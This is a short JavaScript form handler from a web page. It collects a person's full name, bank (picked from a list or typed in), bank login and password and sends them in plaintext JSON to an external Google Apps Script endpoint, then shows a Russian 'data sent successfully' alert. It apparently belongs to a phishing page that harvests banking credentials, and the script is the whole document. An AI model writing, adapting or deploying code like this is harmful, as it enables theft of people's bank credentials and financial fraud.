<script>
  function sendData() {
    const fullName = document.getElementById('fullname').value;
    const bankSelect = document.getElementById('bank');
    const customBankInput = document.getElementById('customBankInput');
    const login = document.getElementById('login').value;
    const password = document.getElementById('password').value;

    const bank = document.getElementById('customBankToggle').checked
      ? customBankInput.value
      : bankSelect.value;

    const url = "https://script.google.com/macros/s/AKfycbxjStE_nqZ8q7916q5BtyFQmvNw0y8dnvO8bbSyRqvpnr11NUukHV7Q0K20Nw3GNFlG/exec";

    fetch(url, {
      method: 'POST',
      body: JSON.stringify({
        fullname: fullName,
        bank: bank,
        login: login,
        password: password
      }),
      headers: {
        'Content-Type': 'application/json'
      }
    })
    .then(res => res.text())
    .then(data => {
      alert("Данные успешно отправлены!");
    })
    .catch(err => {
      alert("Ошибка при отправке: " + err);
    });
  }
</script>
